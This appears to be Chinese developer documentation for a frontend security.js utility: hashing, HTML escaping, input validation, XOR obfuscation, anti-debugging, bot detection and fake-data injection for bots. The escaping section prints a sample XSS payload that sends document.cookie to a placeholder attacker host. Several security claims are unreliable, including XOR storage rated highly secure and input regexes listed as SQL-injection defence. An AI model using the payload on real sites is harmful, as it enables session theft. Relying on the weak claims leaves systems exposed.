# security.js 安全工具文件详解

> 达州文化管理系统前端安全工具库

## 一、文件概述

**路径**: `src/utils/security.js`

**作用**: 前端安全防护工具箱，提供加密、解密、输入过滤、机器人检测、调试防护等功能

**导出方式**: ES6模块导出 `export const securityUtils`

---

## 二、函数详解

### 2.1 密码哈希函数

#### `sha256(str)` - SHA-256加密

```
位置: 第2-8行
类型: async异步函数
用途: 将任意字符串转换为64位十六进制哈希值
不可逆: 是（无法从哈希值反推原字符串）
```

**使用场景**:
- 用户密码传输前加密
- 生成唯一标识符
- 数据完整性校验

**示例**:
```javascript
await sha256("123456")
// 结果: "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92"
```

**原理**:
1. TextEncoder将字符串转为字节数组
2. crypto.subtle.digest使用SHA-256算法计算哈希
3. 字节数组转为十六进制字符串

---

#### `md5(str)` / `_md5Fast(str)` - MD5快速哈希

```
位置: 第10-21行
类型: 同步函数
用途: 快速生成短哈希值
不可逆: 是
注意: MD5已被破解，不适合加密敏感数据
```

**与SHA-256的区别**:
| 特性 | SHA-256 | MD5 |
|------|---------|-----|
| 输出长度 | 64字符 | 8字符 |
| 速度 | 慢 | 快 |
| 安全性 | 高 | 低（已破解） |

---

### 2.2 输入安全函数

#### `escapeHtml(unsafe)` - HTML转义

```
位置: 第23-31行
用途: 防止XSS跨站脚本攻击
原理: 将特殊字符替换为HTML实体
```

**转义规则**:
| 原字符 | 转义后 | 说明 |
|--------|--------|------|
| `&` | `&amp;` | 英文and |
| `<` | `&lt;` | 小于号 |
| `>` | `&gt;` | 大于号 |
| `"` | `&quot;` | 双引号 |
| `'` | `&#039;` | 单引号 |

**攻击示例**:
```javascript
// 恶意输入
"<script>document.location='http://hack.com?c='+document.cookie</script>"

// 转义后变成普通文本，不会被执行
"&lt;script&gt;document.location='http://hack.com?c='+document.cookie&lt;/script&gt;"
```

---

#### `validateInput(input, type)` - 输入验证

```
位置: 第33-49行
用途: 验证用户输入是否符合格式要求
参数: type可选 username|password|key|text
```

**验证规则**:

| 类型 | 正则表达式 | 要求 |
|------|----------|------|
| username | `/^[a-zA-Z0-9_\u4e00-\u9fa5]{2,20}$/` | 字母数字汉字，2-20位 |
| password | `/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]{6,20}$/` | 特定字符，6-20位 |
| key | `/^[0-9]{4,20}$/` | 纯数字，4-20位 |
| text | `/^[\s\S]{0,500}$/` | 任意字符，最多500位 |

**返回值**:
```javascript
{ valid: true, sanitized: "消毒后的输入" }
{ valid: false, sanitized: "" }
```

---

### 2.3 加密相关函数

#### `encryptPassword(password, salt)` - 密码加密

```
位置: 第51-66行
类型: async异步函数
用途: 登录时加密密码
```

**加密过程**:
```
1. 生成时间戳: Date.now()
2. 生成随机字符串: Math.random().toString(36)
3. 拼接: 随机字符串 + 时间戳 + 密码 + 盐值
4. SHA-256哈希
5. 返回加密结果和时间戳
```

**返回值**:
```javascript
{
  encrypted: "哈希值",
  timestamp: 1234567890,
  random: "随机字符串"
}
```

---

#### `simpleHash(str)` - 简单哈希

```
位置: 第68-76行
用途: 生成8位短哈希
特点: 快速、不可逆
```

**原理**: 字符串的每个字符都参与运算，最终取绝对值并转为16进制

---

#### `generateCSRFToken()` - 生成CSRF令牌

```
位置: 第78-82行
用途: 防止CSRF跨站请求伪造攻击
长度: 64位
```

**原理**:
1. 创建32字节的随机数组
2. 每个字节转为2位十六进制
3. 拼接成64位字符串

---

#### `validateSecurityKey(key)` - 密钥格式验证

```
位置: 第84-87行
用途: 验证安全密钥格式
规则: 7位数字，范围 1000001-9999998
```

---

#### `encodeData(data)` / `decodeData(encoded)` - Base64编解码

```
位置: encodeData: 第89-101行
位置: decodeData: 第103-115行
用途: 数据base64格式转换
```

**用途**:
- URL安全传输数据
- 简单数据混淆
- localStorage存储特殊字符

**示例**:
```javascript
encodeData({name: "张三", age: 25})
// 结果: "eyJuYW1lIjoi6I2J5Z2AIiwiYWdlIjoyNX0="

decodeData("eyJuYW1lIjoi6I2J5Z2AIiwiYWdlIjoyNX0=")
// 结果: {name: "张三", age: 25}
```

---

#### `obfuscateString(str)` / `deobfuscateString(obfuscated)` - 字符串混淆

```
位置: obfuscateString: 第117-128行
位置: deobfuscateString: 第130-141行
用途: 简单可逆加密
原理: XOR异或运算
```

**原理图**:
```
原始字符:     A (ASCII 65) - B (ASCII 66) - C (ASCII 67)
混淆值:       0x55 (85)
XOR运算:     65⊕85=20  - 66⊕85=23  - 67⊕85=22
混淆结果:     ←乱码→
还原:        20⊕85=65  - 23⊕85=66  - 22⊕85=67
```

---

#### `xorEncrypt(str, key)` / `xorDecrypt(str, key)` - XOR对称加密

```
位置: 第143-151行
与混淆的区别: 需要传入密钥key
```

**特点**:
- 加密解密用同一个密钥
- 速度极快
- 适合大量数据加密

---

### 2.4 检测函数

#### `generateBehaviorKey(mouseMoves, keyPresses)` - 生成行为密钥

```
位置: 第153-157行
用途: 根据鼠标和键盘行为生成唯一标识
```

**原理**:
```
鼠标位置异或求和 ⊕ 键盘按键异或求和 = 行为密钥
```

---

#### `_checkDevToolsSync()` - 同步检测开发者工具

```
位置: 第159-162行
用途: 检测浏览器开发者工具是否打开
原理: 窗口尺寸变化检测
```

**原理**:
```
正常浏览器:
  outerWidth - innerWidth ≈ 0
  outerHeight - innerHeight ≈ 0

打开开发者工具:
  outerWidth - innerWidth > 160
  outerHeight - innerHeight > 160
```

---

#### `checkDevTools()` - 异步检测开发者工具

```
位置: 第164-186行
类型: Promise异步
增加: DOM元素尺寸检测
```

**双重检测**:
1. 同步：窗口尺寸差值
2. 异步：隐藏元素尺寸变化

---

#### `detectDebugger()` - 调试器检测

```
位置: 第188-195行
原理: 代码执行时间检测
```

**原理**:
```
正常执行1000次Math.random(): < 50毫秒
调试模式下执行: > 50毫秒
```

---

#### `detectBot()` - 机器人检测

```
位置: 第197-213行
类型: 多条件综合判断
返回值: true(是机器人) / false(是真人)
```

**检测条件**:
| 条件 | 说明 | 权重 |
|------|------|------|
| `navigator.webdriver` | Selenium自动化 | +1 |
| `HeadlessChrome` | 无头浏览器 | +1 |
| 无插件 | `navigator.plugins`为空 | +1 |
| 无语言 | `navigator.languages`为空 | +1 |
| 无chrome.loadTimes | 模拟Chrome | +1 |
| 无indexedDB | 浏览器功能缺失 | +1 |
| 无hardwareConcurrency | CPU核心数获取失败 | +1 |
| 屏幕<200px | 异常屏幕尺寸 | +1 |

**判定规则**: 得分 >= 3 → 判定为机器人

**注意**: localhost和127.0.0.1直接返回false（开发环境跳过检测）

---

#### `generateHumanToken()` - 生成人类凭证

```
位置: 第215-218行
类型: async异步函数
用途: 生成证明用户是真实人类的令牌
```

**组成**:
```
时间戳-CPU核心数-屏幕分辨率-浏览器语言
```

---

### 2.5 安全存储

#### `secureSessionStorage` - 安全会话存储

```
位置: 第220-241行
特点: 混淆后存储，防止控制台直接查看
```

**对比**:
| 方式 | 普通sessionStorage | secureSessionStorage |
|------|-------------------|---------------------|
| 存储 | 直接存明文 | 先混淆再存 |
| 读取 | 直接读明文 | 先解密再返回 |
| 安全性 | 低 | 高 |

**使用**:
```javascript
secureSessionStorage.setItem('token', {key: 'abc123'})
const token = secureSessionStorage.getItem('token')
secureSessionStorage.removeItem('token')
```

---

### 2.6 防护系统

#### `antiDebug` - 抗调试系统

```
位置: 第243-298行
功能: 检测并阻止开发者调试
```

**工作流程**:
```
1. 每500ms执行一次检测
2. 同时检测开发者工具和调试器
3. 累加异常得分

开发环境(localhost):
  检测到异常 → 强制刷新页面

生产环境:
  异常得分 >= 3 → 页面模糊 + 禁止操作 + 显示警告条
```

**警告条内容**:
```
"检测到异常环境，页面已锁定。"
[页面显示异常？点此安全刷新]
```

**注意**: 开发环境下不执行防护

---

#### `behaviorTracker` - 行为追踪系统

```
位置: 第300-431行
功能: 追踪用户行为，判断是否真人
```

**追踪数据**:
| 数据类型 | 记录内容 | 保留数量 |
|----------|----------|----------|
| 鼠标移动 | 坐标x,y,时间戳 | 最多50条 |
| 键盘按键 | 按键码,时间戳 | 最多30条 |
| 滚动事件 | 时间戳 | 最多10条 |

**人类特征分析**:

1. **非线性移动** (第342-358行)
   ```
   计算连续3个鼠标点的角度变化
   角度差 > 0.1弧度 → 非线性移动 +1
   机器人特点：移动轨迹过于直线
   ```

2. **滚动停顿** (第360-365行)
   ```
   检测两次滚动的间隔时间
   间隔 > 1秒 → 滚动停顿 +1
   人类会停下来看内容
   ```

3. **按键间隔** (第367-375行)
   ```
   检测连续按键的时间间隔
   存在 > 200毫秒的间隔 → 正常
   机器人特点：按键极快无间隔
   ```

4. **曲率分析** (第388-411行)
   ```
   计算鼠标移动速度方差
   方差 < 0.05 → 判定为机器
   正常人类移动速度有快有慢
   ```

**真人判定条件**:
```
非线性移动 >= 5
滚动停顿 >= 2
按键间隔 > 200ms存在
速度方差 >= 0.05
```

**结果标记**:
- `isHuman`: 是否人类
- `verified`: 是否通过验证
- 验证通过后存入 `sessionStorage.human_verified`

---

#### `fakeDataInjector` - 假数据注入器

```
位置: 第433-509行
功能: 对机器人返回假数据
```

**工作原理**:
```
1. 保存原始fetch函数
2. 覆盖window.fetch
3. 每次API请求先detectBot()
4. 如果是机器人 → 返回假数据
5. 否则 → 调用原始fetch
```

**假数据示例**:
```javascript
{
  spots: [
    { name: 'XX公园', description: 'fake_value_0.123456' },
    { name: 'YY广场', description: '数据噪声_abc123' }
  ],
  contacts: { phone: '0818-9999', email: 'fake@example.com' }
}
```

**注意**: localhost环境下不启用

---

#### `contentProtector` - 内容保护器

```
位置: 第511-543行
功能: 未验证用户阻止访问内容
```

**工作流程**:
```
1. 等待5秒
2. 检查behaviorTracker.isHuman
3. 如果不是真人 → 显示黑色遮罩 + 验证码
```

**遮罩内容**:
```
┌─────────────────────────────┐
│                             │
│     请完成验证以继续浏览      │
│                             │
│       5 + 3 = ?            │
│                             │
│   [页面显示异常？点此安全刷新] │
│                             │
└─────────────────────────────┘
```

---

### 2.7 工具函数

#### `enableAll()` / `disableAll()` - 一键开关

```
位置: enableAll: 第545-550行
位置: disableAll: 第552-556行
用途: 批量启用/关闭所有防护
```

**启用顺序**:
```
1. antiDebug.enable()
2. behaviorTracker.init()
3. fakeDataInjector.enable()
4. contentProtector.init()
```

---

#### `debounce(func, wait, immediate)` - 防抖函数

```
位置: 第558-570行
用途: 限制函数执行频率
场景: 搜索框输入、窗口 resize
```

**防抖原理**:
```
用户输入: a → ab → abc → abcd
         ↓     ↓     ↓     ↓
       等待  等待  等待   执行
       300ms 300ms 300ms
       
只执行最后一次
```

---

#### `throttle(func, limit)` - 节流函数

```
位置: 第572-580行
用途: 限制函数执行频率
场景: 滚动事件、按钮点击
```

**节流原理**:
```
用户滚动: ▁▂▃▄▅▆▇█▇▆▅▄▃▂▁
           ↓   ↓   ↓   ↓   ↓
          执行 执行 执行 执行 执行
          
固定间隔执行，比如每300ms最多一次
```

---

#### `debounce` vs `throttle` 对比

| 特性 | debounce | throttle |
|------|----------|----------|
| 首次执行 | 立即/等待 | 立即 |
| 最后执行 | 延迟 | 不延迟 |
| 适用场景 | 输入搜索 | 滚动/点击 |

---

## 三、全局函数

### `window.reloadClean()` - 安全刷新

```
位置: 第584-587行
作用: 清除状态后强制刷新页面
触发: security banner中的刷新按钮
```

**执行过程**:
```
1. sessionStorage设置 bypass_protection = '1'
2. window.location.reload()
3. 页面刷新，可重新验证
```

---

### `beforeunload` 事件监听

```
位置: 第589-593行
作用: 页面关闭时自动禁用所有防护
防止: 关闭后防护仍在后台运行
```

---

## 四、安全策略矩阵

| 攻击类型 | 防护函数 | 防护层级 |
|----------|----------|----------|
| XSS跨站脚本 | escapeHtml | 输入层 |
| SQL注入 | validateInput | 输入层 |
| CSRF攻击 | generateCSRFToken | 请求层 |
| 密码泄露 | sha256/encryptPassword | 传输层 |
| 调试攻击 | antiDebug | 运行环境层 |
| 机器人爬虫 | detectBot/fakeDataInjector | 访问层 |
| 内容盗取 | contentProtector | 内容层 |
| 会话劫持 | secureSessionStorage | 存储层 |

---

## 五、使用示例

### 5.1 登录密码加密

```javascript
import { securityUtils } from '@/utils/security'

const login = async () => {
  const encrypted = await securityUtils.encryptPassword(password)
  // 传输encrypted到后端
}
```

### 5.2 用户输入过滤

```javascript
const handleSubmit = () => {
  const validation = securityUtils.validateInput(username, 'username')
  if (!validation.valid) {
    alert('用户名格式错误')
    return
  }
  const safeInput = securityUtils.escapeHtml(userInput)
}
```

### 5.3 启用完整防护

```javascript
import { securityUtils } from '@/utils/security'

// 在main.js或App.vue中
securityUtils.enableAll()
```

### 5.4 API请求拦截（机器人返回假数据）

```javascript
// fakeDataInjector会自动拦截fetch
const response = await fetch('/api/spots')
// 机器人会得到假数据，真人会得到真数据
```

---

## 六、注意事项

1. **开发环境跳过**: localhost/127.0.0.1 下不启用高级防护
2. **性能影响**: antiDebug每500ms检测，可能影响低配设备
3. **行为追踪**: 依赖真实用户行为，开发测试时可能误判
4. **假数据**: 只在生产环境生效，不影响开发调试
5. **sessionStorage**: 刷新页面行为追踪数据会重置

---

## 七、版本历史

- v1.0: 初始版本，包含基础加密和验证
- v1.1: 添加antiDebug抗调试系统
- v1.2: 添加behaviorTracker行为追踪
- v1.3: 添加fakeDataInjector假数据注入
- v1.4: 添加contentProtector内容保护
